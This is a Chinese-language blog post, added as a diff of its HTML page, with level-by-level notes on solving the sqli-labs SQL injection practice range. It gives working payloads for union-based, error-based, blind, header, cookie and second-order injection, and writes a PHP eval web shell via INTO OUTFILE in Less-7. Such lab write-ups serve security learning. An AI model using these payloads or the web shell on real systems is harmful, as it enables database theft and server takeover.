@@ -1,0 +1,1207 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="sqli-labs通关笔记, Atmujie">
+    <meta name="description" content="有一美人兮，见之不忘，一日不见兮，思之如狂；">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>sqli-labs通关笔记 | Atmujie</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Atmujie</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Atmujie</div>
+        <div class="logo-desc">
+            
+            有一美人兮，见之不忘，一日不见兮，思之如狂；
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/5.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">sqli-labs通关笔记</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E9%9D%B6%E5%9C%BA/">
+                                <span class="chip bg-color">靶场</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-11-06
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="Less-1-10-通关笔记"><a href="#Less-1-10-通关笔记" class="headerlink" title="Less(1-10)通关笔记"></a>Less(1-10)通关笔记</h1><h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><p>本题有回显有报错，使用联合查询  </p>
+<ul>
+<li><p>目标：</p>
+<blockquote>
+<p>查明该网站数据库表名，列数列名，以及得到所用的用户数据。</p>
+</blockquote>
+</li>
+<li><p>1、使用hackbar输入 ?id=1 得到结果，正常显示;</p>
+</li>
+<li><p>2、输入id=1’ 显示错误，说明输入的’已经被数据库解析，告诉我可以通过闭合’’的形式将代码写入数据库，进行注入攻击。</p>
+</li>
+<li><p>3、确定列数  </p>
+<blockquote>
+<p>输入?id=1时回显有Your Login name和Your Password两组数据，加id列猜测该数据库为三列<br>用order by 语句验证：<br>输入至order by 4 时出现报错，说明猜测正确，该数据库有三列<br><img src="1.png" alt="1"></p>
+</blockquote>
+</li>
+<li><p>4、确定注入点  </p>
+<blockquote>
+<p>使用union select联合查询查看回显，确定注入点。<br>?id=-1’ union select 1,2,3;<br>//使id报错，根据第三步所得列数，确定第二和第三列有回显，可以注入。<br><img src="2.png" alt="2"></p>
+</blockquote>
+</li>
+<li><p>5、查看数据库名。  </p>
+<blockquote>
+<p>在union select 1,2,3; 的基础上，在注入点位置分别输入database()得到数据库名security。<br><img src="3.png" alt="3"></p>
+</blockquote>
+</li>
+<li><p>6、得到所有数据库信息  </p>
+<blockquote>
+<p>利用information_schema数据库<br>?id=-1’ union select 1,2,group_concat(schema_name) from information_schema.schemata –+<br>//使第三列回显数据库information_schema中表schemata的信息<br>注：数据库information_schema中表schemata储存着的列chema_name的所有数据库的信息<br><img src="7.png" alt="7"></p>
+</blockquote>
+</li>
+<li><p>7、得到当前数据库中所有表名  </p>
+<blockquote>
+<p>同第6步，利用information_schema数据库<br>已知当前数据库名security。<br>?id=-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=”security” –+<br>//使第三行回显数据库information_schema中表tables中列table_name的信息，该列储存表名，并用where限定列table_schema为security。<br><img src="9.png" alt="9"></p>
+</blockquote>
+</li>
+<li><p>8、查看当前表中的列名  </p>
+<blockquote>
+<p>同上两步，将命令改为<br>?id=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=users –+<br>//转16进制<br><img src="10.png" alt="10"></p>
+</blockquote>
+</li>
+<li><p>9、取出所有用户名和密码  </p>
+<blockquote>
+<p>同前几步，将group_concat中添加group_concat_ws()即可<br>?id=-1’ union select 1,2,group_concat(concat_ws(“~”,username,password)) from security.users –+<br><img src="11.png" alt="11"></p>
+</blockquote>
+</li>
+</ul>
+<p>Less-1目标达成  </p>
+<h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>同Less-1，只是将id的类型改为了整形，无需再使用单引号闭合。<br>1、再less-1的基础上，输入?id=1 and 1=2 –+<br>出现报错，说明id是整型<br>若id非整形，则会将“1 and 1=2”看作一个整体字符，因后面的limit 0,1正常输出，而整形只输入了“1”，后面的and 1=2 会使语句报错，无法正常输出  </p>
+<blockquote>
+<p>闭合类型判断方法<br>输入 ?id=1 and 1=1 –+<br>正常 //id为整形或字符型或程序后加limit0,1语句<br>报错 //程序后无limit语句，并为字符型  </p>
+</blockquote>
+<blockquote>
+<p>输入 ?id=1 and 1=2 –+<br>正常 //程序后有limit语句且为字符型<br>报错 //为整形或字符型后无limit语句  </p>
+</blockquote>
+<blockquote>
+<p>输入 id=1’ and 1=1 –+<br>正常 //字符型单引号闭合或其他闭合符号<br>报错 //整形   </p>
+</blockquote>
+<blockquote>
+<p>确定是整形或非整形后<br>输入 ?id=1’ 查看报错信息即可得到闭合符号<br>然后用order by 9999999999999999999 –+确认，出现报错说明闭合符正确<br>若后面存在limit语句，在没有正确输入闭合符前，系统会将输入的所有内容按字符处理<br>注意：最多输入19个9，也就是数据不能溢出，这样的目的是查看是否会正常报错，19个以上的9占字节高出字符型范围，会导致报错，这样无法判断报错原因    </p>
+</blockquote>
+<h3 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h3><p>确定有limit语句时<br>可用?id=1 order by 999999999–+一步判断是否为整型  </p>
+<h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>大体同前两题，经过测试，该题为字符型，以’)包裹  </p>
+<blockquote>
+<p>总结：<br>1：字符型会自动加入两个单引号。<br>2：数字型不会加入两个单引号。<br>3：被单引号括起来的数据会被当成一个整体。<br>4：LIMIT m,n 会影响select语句的结果。<br>5：页面回显发生错误和页面不回显数据是两回事。前者表示sql语句出错了，后者表示sql语句没有错误，但是条件不成立   </p>
+</blockquote>
+<h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>经测试，id使用”)闭合，其他内容同前三道  </p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote>
+<p>前四道题均考查有回显状态的sql注入，主要对联合查询进行学习，还可以使用报错注入的方法  </p>
+</blockquote>
+<blockquote>
+<p>主要需掌握联合查询，数据库基本结构，闭合符的探测等  </p>
+</blockquote>
+<h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p>本题无回显但有报错（order by 999探测是否有报错），所以使用报错注入<br>1、确定闭合方式与列数    </p>
+<blockquote>
+<p>本题有报错<br> 输入：?id=1 显示正常<br> 输入：?id=1’ 报错 根据报错信息确定为单引号闭合<br> <img src="/2020/11/06/sqli-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/12.png" class=""><br> 使用order by确定列数，结果为3列<br> ?id=1’ order by 3 –+  </p>
+</blockquote>
+<p>2、确定数据库名  </p>
+<blockquote>
+<p>因无回显，所以这道题要使用盲注，使用left()函数猜出库名<br> ?id=1’ and left(database(),1)&gt;”c” –+ //确定第一位，结果为s<br> ?id=1’ and left(database(),2)&gt;”sa” –+ //确定第二位，结果为se<br> 猜测与前几道题共用一个数据库<br> 验证：?id=1’ and left(database(),1000)=”security” –+ //猜测正确<br><img src="13.png" alt="13"></p>
+</blockquote>
+<p>3、得到所有表名   </p>
+<blockquote>
+<p>?id=1’ and updatexml(1,(select group_concat(0x7e,table_name) from information_schema.tables where table_schema=”security”),0)–+<br> 使用updatexml报错注入确定表名<br> updatexml报错返回的长度有限，可后加limit语句逐个输出<br> 如爆出所有数据库名：?id=1’ and updatexml(1,(select concat(0x7e,schema_name) from information_schema.schemata limit 4,1),0)–+<br><img src="14.png" alt="14"></p>
+</blockquote>
+<p>4、得到所有列名  </p>
+<blockquote>
+<p>?id=1’ and updatexml(1,(select concat(0x7e,column_name) from information_schema.columns where table_name=”users” limit 4,1),0)–+<br> 大体同表名注入  </p>
+</blockquote>
+<p>5、得到所有数据  </p>
+<blockquote>
+<p>?id=1’ and updatexml(1,(select concat(0x7e,username,0x7e,password) from security.users limit 0,1),0)–+<br> 大体同上  </p>
+</blockquote>
+<h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p>解法同第五题，经测试为双引号报错注入<br>值得注意：在第6题中，users表的第4列是password，第五列是username,顺序与之前相反  </p>
+<p>总结：5、6题与前四道主要区别在于有无回显<br>思路：<br>1、探测是否可以注入，有无注入漏洞<br>2、确定闭合方式<br>3、查看有无回显和报错  </p>
+<blockquote>
+<p>有回显有报错：方法随意<br> 有回显无报错：联合查询<br> 无回显有报错：报错注入<br> 无回显无报错：盲注    </p>
+</blockquote>
+<h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><p>考察一句话木马的使用  </p>
+<p>1、确定是否存在注入漏斗以及闭合方式  </p>
+<blockquote>
+<p>?id=1’)) and 1=1–+<br> ?id=1’)) order by 3–+<br> 存在注入漏洞，使用’))闭合内容，无回显与报错，初步判断使用盲注    </p>
+</blockquote>
+<p>2、确定数据库名  </p>
+<blockquote>
+<p>?id=1’)) and left(database(),9)=”security”–+  </p>
+</blockquote>
+<p>3、写入一句话木马  </p>
+<blockquote>
+<p>前提：知道网站绝对路径<br> ?id=’)) union select “<?php @eval($_POST["a"]);?>“ into outfile “路径\1.php”–+  </p>
+</blockquote>
+<blockquote>
+<p>这里我发现了一个快速爆库的办法<br> 在输入：?id=1’)) and “<?php @eval($_POST["a"]);?>“ into outfile “路径\1.php”–+时<br> 1.php注入成功，但文件里没有写好的一句话木马<br> 猜测，sql命令用and连接会进行判断将”<?php @eval($_POST["a"]);?>“当作普通字符串或命令处理，<br> sql命令结构变为先?id=1’)) and “<?php @eval($_POST["a"])?>“，恒正确<br> 又select 1 into outfile “路径\1.php”–+<br> 导致只是注入了1.php但1，php没有值<br> 不知道怎么验证  </p>
+</blockquote>
+<p> 再次尝试<br> 想到or语句，忽略or后一句的错误<br> ?id=1’)) or “<?php @eval($_POST["a"]);?>“ into outfile “路径\1.php”–+<br> 结构为：?id=1’))正确,”<?php @eval($_POST["a"]);?>“不在进行or判断<br> 所以结构为:?id=1’)) into file “路径\1.php”–+<br> 验证成立<br> 得到id=1的数据！！</p>
+<p> 兴趣来了，虽然不知道他到底以为一句话是什么，但我可以让他报错<br> ?id=1’)) or 1 into outfile “路径\1.php”–+<br> 注入的文件夹里出现了所有的数据！<br> 但我不懂这要怎么理解<br> 不管我把路径改到哪，我都得到了数据<br><img src="16.png" alt="16"></p>
+<p> 然而，这在实际注入操作中并没有什么作用，因为前提是知道路径，还要能查看文件<br> 不如一句话木马实际  </p>
+<p>4、使用蚁剑连接<br><img src="17.png" alt="17"> 成功  </p>
+<h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><p>1、确定闭合方式 </p>
+<blockquote>
+<p>?id=1’–+ 返回界面正确，确定为单引号闭合，无回显，无报错。<br> 初步判断为布尔盲注   </p>
+</blockquote>
+<p>2、确定数据库名  </p>
+<blockquote>
+<p>?id=1’ and left(database(),999)=”security”–+<br> 返回正确，确定数据库为security  </p>
+</blockquote>
+<p>4、盲注出所有数据  </p>
+<blockquote>
+<p>如：?id=1’ and ascii(substr((select schema_name from information_schame.schemata limit 0,1),1,1))&gt;122 –+<br> 类似此种语句爆出所有内容<br> 可以写脚本或使用工具</p>
+</blockquote>
+<h2 id="Less-9-and-Less-10"><a href="#Less-9-and-Less-10" class="headerlink" title="Less-9 and Less-10"></a>Less-9 and Less-10</h2><p>1、确定注入漏洞，闭合方式  </p>
+<blockquote>
+<p>输入id=1,id=-1,id=999回显均相同且无报错<br> 初步判断需使用时间盲注  </p>
+</blockquote>
+<blockquote>
+<p>?id=1’ and sleep(5) 出现响应延迟，确定为单引号闭合  </p>
+</blockquote>
+<p>2、确定数据库名  </p>
+<blockquote>
+<p>?id=1’ and if(ascii(substr(database(),1,1)) &gt; 22,sleep(5),1)–+<br> 如果数据库第一个字符ascii值大于22，延时5秒，否则返回1<br> 原理：无论输入何值回显均不变，但输入正确会延时，错误延时亦可  </p>
+</blockquote>
+<p>3、确定数据  </p>
+<blockquote>
+<p>在布尔盲注的基础上加入sleep语句通过是否有延时判断  </p>
+</blockquote>
+<p>Less-10 与Less-9相比，只是将单引号闭合改为双引号闭合   </p>
+<p>语句示例：<br>?id=1’ and if((substr((select table_name from information_schema.tables  where table_schema=”security”<br> limit 3,1),1,999)=”users”),sleep(3),1)–+</p>
+<h2 id="Less-11-and-12"><a href="#Less-11-and-12" class="headerlink" title="Less-11 and 12"></a>Less-11 and 12</h2><p>1、确定传输方式  </p>
+<blockquote>
+<p>输入任意值，打开network查看请求头为post传参<br> 使用hackbar的post注入  </p>
+</blockquote>
+<p>2、确定注入漏洞，闭合方式以及注入点  </p>
+<blockquote>
+<p>查看network,data文件上传了三个内容，所以构建语句<br> uname: admin&amp;passwd: admin&amp;submit: Submit<br> 输入后报错，测试发现submit始终不变，可能是提交键，故删除submit<br> 即：uname=admin&amp;passwd=admin  </p>
+</blockquote>
+<blockquote>
+<p>确定闭合方式的方法与get注入基本一致<br> uname=admin’ and 1=2#&amp;passwd=# 确定为单引号闭合<br> 注意：#也是注释符，效果同–+，最后用#是因为使用–+会出现未知错误，当然可以使用– aaa(此处为任意值)</p>
+</blockquote>
+<blockquote>
+<p>用admin测试有返回内容,用order by 测试有报错信息<br> 联合查询与报错注入均可使用  </p>
+</blockquote>
+<p>3、得到数据  </p>
+<blockquote>
+<p>联合查询：uname=’ union select 1,database()–+ &amp;passwd=#<br>  报错注入：<br>  uname=admin’ and extractvalue(1,(select concat(0x7e,database())))#&amp;passwd=#<br>  uname=admin’ and updatexml(1,(select concat(0x7e,database())),0)#&amp;passwd=#  </p>
+</blockquote>
+<p>Less-12只是将闭合方式改为(“”)，其他内容无区别  </p>
+<p>值得一提：<br>考虑到管理员用户名不可能全是admin，故我对sql语句进行以下更改  </p>
+<p>1、判断闭合方式<br>uname=’ or 1=1#<br>2、使用注入语句<br>盲注：unmae=’ or 1=1 and substr(database(),1,1)=”s”#<br>报错注入：uname=’ or 1=1 and updatexml(1,(select concat(0x7e,database())),0)#<br>联合查询本就要让用户名报错，所以不需要知道用户名</p>
+<h2 id="Less-13-and-14"><a href="#Less-13-and-14" class="headerlink" title="Less-13 and 14"></a>Less-13 and 14</h2><blockquote>
+<p>无回显有报错，使用报错注入即可<br>  uname=’) or 1=1 and extractvalue(1,(select concat(0x7e,database())))# &amp;passwd=#<br>  语句同get注入  </p>
+</blockquote>
+<blockquote>
+<p>Less-14也是报错型，闭合方式为双引号，其余同Less-13  </p>
+</blockquote>
+<h2 id="Less-15-and-16"><a href="#Less-15-and-16" class="headerlink" title="Less-15 and 16"></a>Less-15 and 16</h2><blockquote>
+<p>单引号闭合，无报错无回显，正确与错误的页面有区别，使用布尔盲注最佳<br> uname=’ or 1=1 and (ascii(substr(database(),1,1))&gt;11)# &amp;passwd=#<br> 使用脚本跑即可  </p>
+</blockquote>
+<blockquote>
+<p>“)闭合，同Less-15无回显无报错，使用布尔盲注  </p>
+</blockquote>
+<h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><blockquote>
+<p>密码重置，username不可改<br> 将username输入admin,向password注入即可   </p>
+</blockquote>
+<h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><blockquote>
+<p>user agent 注入<br> 默认用户名密码admin<br> 使用header注入中的user agent注入即可</p>
+</blockquote>
+<h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><blockquote>
+<p>读代码，网页保存了我们的ip和referer，insert into ‘security’.’referers’(referer,ip_address) value (‘$referers’,’$ip’);<br> 可知注入语句需用’闭合后在后面补齐语句，故为： ‘ or [语句] ,’ ‘);#<br> 语句用报错注入即可</p>
+</blockquote>
+<h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><blockquote>
+<p>读代码，cookie注入可用，单引号闭合<br> 存在回显点，联合查询</p>
+</blockquote>
+<h2 id="Less-21-and-Less-22"><a href="#Less-21-and-Less-22" class="headerlink" title="Less-21 and Less-22"></a>Less-21 and Less-22</h2><blockquote>
+<p>cookie注入，但根据回显，cookie进行了base64编码<br> 将注入语句全部改为base64编码即可</p>
+</blockquote>
+<blockquote>
+<p>22题在21题基础上将闭合方式改双引号闭合，其他无改变</p>
+</blockquote>
+<h2 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h2><blockquote>
+<p>过滤了–和 # 这两个注释符，改用’1’=’1 或者;%00即可</p>
+</blockquote>
+<h2 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h2><blockquote>
+<p>本关为二次注入<br> 所有用户可交互的位置均无注入点<br> 但不可直接交互的位置存在注入，即改密时的用户名</p>
+</blockquote>
+<p> 1、注册用户，用户名设为admin’#<br>    此时因为限制’#不会注入，而是作为用户名的一部分存入数据库</p>
+<p> 2、更改密码时，会在表单提交update users set password=’{新密码}’ where username=’{用户名}’ and password=’{旧密码}’;<br>    这里用户名中’#形成了注入，注释了后面的内容，更改了admin的密码<br>    admin’#的密码并没有被改变 </p>
+<h2 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h2><blockquote>
+<p>过滤<br> 使用异或语句检查被过滤的字段，id=1’ ^ (length(‘union’)!=0)–+<br> 返回正常即被过滤，错误即未被过滤<br> 其他注入相同</p>
+</blockquote>
+<h2 id="Less-26-amp-amp-27-amp-amp-28-amp-amp-d-a"><a href="#Less-26-amp-amp-27-amp-amp-28-amp-amp-d-a" class="headerlink" title="Less-26 &amp;&amp; 27 &amp;&amp; 28 &amp;&amp; /d*a"></a>Less-26 &amp;&amp; 27 &amp;&amp; 28 &amp;&amp; /d*a</h2><blockquote>
+<p>都过滤了空格，跑脚本没有发现可以代替空格的字符，所以使用括号绕过空格<br> 示例语句：<br> ?id=’uNion(seLect(1),(2),(group_concat(table_name) ) from(information_schema.tables) where (table_schema=0x7365637572697479));%00</p>
+</blockquote>
+<h2 id="后全"><a href="#后全" class="headerlink" title="后全"></a>后全</h2><p>32-38（忘了）为宽字节注入<br>在单引号双引号处用了转义符处理，所以用%df或者%bb将/变为特殊字符，即可进行正常注入</p>
+<h2 id="40后与之前知识点相同"><a href="#40后与之前知识点相同" class="headerlink" title="40后与之前知识点相同"></a>40后与之前知识点相同</h2><ul>
+<li>报错注入秀操作<br>updatexml(1,(substr((select concat(0x7e,table_name)from information_schema.tables where table_schema=”security”),1,1)),0)<br>使用substr分隔字符串达到查看所有库的目的而不是使用limit，查询方便还不易被过滤。</li>
+</ul>
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Atmujie</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://mujie00.github.io/2020/11/06/sqli-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/">http://mujie00.github.io/2020/11/06/sqli-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Atmujie</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
